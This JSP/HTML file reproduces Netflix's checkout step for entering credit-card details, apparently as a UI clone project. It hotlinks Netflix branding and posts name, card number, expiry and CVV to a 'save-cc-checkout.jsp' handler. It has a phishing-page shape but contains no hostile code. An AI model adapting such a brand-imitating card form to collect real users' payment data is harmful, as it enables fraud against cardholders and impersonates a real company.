<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="ISO-8859-1">
<title>Checkout</title>
<link rel="stylesheet" href="./css/checkoutstyle.css">


    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css"
      integrity="sha512-xh6O/CkQoPOWDdYTDqeRdPCVd1SpvCA9XXcUnZS2FmJNp1coAFzvtCN9BmamE+4aHK8yyUHUSCcJHgXloTyT2A=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico" type="image/x-icon" />

 </head>

  <body>
    <nav class="nav nav-3">
      <a href="">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7a/Logonetflix.png/1600px-Logonetflix.png" alt="" />
      </a>
      <a href="#" class="btn-logout text-underline">Sign Out</a>
    </nav>

    <form method="post" action="save-cc-checkout.jsp" class="main-container margin-inline">
      <div class="gift-code">
        <h2>step 3 of 3</h2>
        <h1 class="margin-bottom-1">Set up your credit or debit card</h1>
      </div>

	<div>
	
	</div>
      <div class="method margin-bottom-1">
        <img class="visa" src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/visa-v3.svg" alt="" />
        <img src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/mastercard-v2.svg" alt="" />
        <img src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/amex-v2.svg" alt="" />
      </div>

      <!-- Name -->

      <div class="input">
        <input class="input-field" type="text" title="Must be at least 8 character" id="input-id" placeholder="password" pattern="[A-Za-z 0-9_+-]{2,}" autocomplete="off" required />

        <label for="input-id" class="input-label label-size">Full name</label>

        <p class="text-error">Please enter your full name.</p>
      </div>

      <!-- Card Number -->

      <div class="input margin-top">
        <input
          class="input-field"
          type="number"
          title="Must be at least 8 character"
          id="password"
          placeholder="password"
          pattern="^(?:4[0-9]{12}(?:[0-9]{3})?|[25][1-7][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$"
          autocomplete="off"
          required
        />

        <label for="input" class="input-label label-size">Card number</label>

        <p class="text-error">Please enter a card number.</p>
      </div>

      <!-- Expiration date -->

      <div class="input margin-top">
        <input class="input-field" type="number" title="Must be at least 8 character" id="password" placeholder="password" pattern="^(0[1-9]|1[0-2])\/?([0-9]{2})$" autocomplete="off" maxlength="5" required />

        <label for="input" class="input-label label-size">Expiration date (MM/YY)</label>

        <p class="text-error">Please enter an expiration month.</p>
      </div>

      <!-- Security code -->

      <div class="input margin-top">
        <input class="input-field" type="number" title="Must be at least 8 character" id="password" placeholder="password" pattern="[0-9]{3,4}" autocomplete="off" maxlength="4" required />

        <label for="input" class="input-label label-size">Security code (CVV)</label>

        <a href=""><i class="fas fa-circle-question fa-2x question"></i></a>

        <p class="text-error">Please enter a security code (CVV).</p>
      </div>

      <a class="btn btn-change margin-block margin-inline" href="choose-plan.jsp">
        <div class="change">
          <p class="text-change">IDR186,000/month</p>
          <p class="text-change-1">Premium Plan</p>
        </div>
        <p class="text-change-2">Change</p>
      </a>
	  
	  
	<!-- <div id="smart-button-container">
      <div style="text-align: center;">
        <div id="paypal-button-container"></div>
      </div>
    </div>
  <script src="https://www.paypal.com/sdk/js?client-id=sb&enable-funding=venmo&currency=USD" data-sdk-integration-source="button-factory"></script>
  <script>
    function initPayPalButton() {
      paypal.Buttons({
        style: {
          shape: 'rect',
          color: 'gold',
          layout: 'vertical',
          label: 'paypal',
          
        },

        createOrder: function(data, actions) {
          return actions.order.create({
            purchase_units: [{"amount":{"currency_code":"USD","value":1}}]
          });
        },

        onApprove: function(data, actions) {
          return actions.order.capture().then(function(orderData) {
            
            // Full available details
            console.log('Capture result', orderData, JSON.stringify(orderData, null, 2));

            // Show a success message within this page, e.g.
            const element = document.getElementById('paypal-button-container');
            element.innerHTML = '';
            element.innerHTML = '<h3>Thank you for your payment!</h3>';

            // Or go to another URL:  actions.redirect('thank_you.html');
            
          });
        },

        onError: function(err) {
          console.log(err);
        }
      }).render('#paypal-button-container');
    }
    initPayPalButton();
  </script>
 -->	  
	  
	  

      <div class="processed margin-bottom">
        <p class="text-terms">Your payments will be processed internationally. Additional bank fees may apply.</p>
        <br />
        <p class="text-terms">
          By checking the checkbox below, you agree to our <span class="text-terms-1">Terms of Use, Privacy Statement, </span>and that you are over 18. Netflix will automatically continue your membership and charge the membership fee
          (currently IDR186,000/month) to your payment method until you cancel. You may cancel at any time to avoid future charges.
        </p>
      </div>

      <div class="agreement">
        <input class="agree-input" type="checkbox" name="" id="agree" required />
        <label class="agree-label" for="agree">I agree.</label>
        <p class="agree-alert">You must anknowledge that you have read and agree to the Terms of Use to continue.</p>
      </div>

      <button type="submit" class="btn-wide margin-top-1 margin-inline">Start Membership</button>
    </form>

    <footer class="footer footer-gray margin-top-1">
      <div class="footer-container margin-inline">
        <p>
          Questions? <br />
          Call 007-803-321-2130
        </p>
        <div class="links">
          <ul class="">
            <li><a class="text-terms text-underline" href="">FAQ</a></li>
            <li><a class="text-terms text-underline" href="">Cookie Preferences</a></li>
          </ul>

          <ul>
            <li><a class="text-terms text-underline" href="">Help Center</a></li>
            <li><a class="text-terms text-underline" href="">Corporate Information</a></li>
          </ul>

          <a class="text-terms text-underline" href="">Terms of Use</a>

          <a class="text-terms text-underline" href="">Privacy</a>
        </div>

        <div class="language">
          <select class="language-select" onchange="location=this.value;">
            <option value="english" selected>English</option>
            <option value="">Bahasa Indonesia</option>
          </select>
          <div class="language-icon">
            <i class="fas fa-globe globe"></i>
            <i class="fas fa-chevron-down chevron"></i>
          </div>
        </div>
      </div>
    </footer>
  </body>
</html>
<!-- partial -->
  
</body>
</html>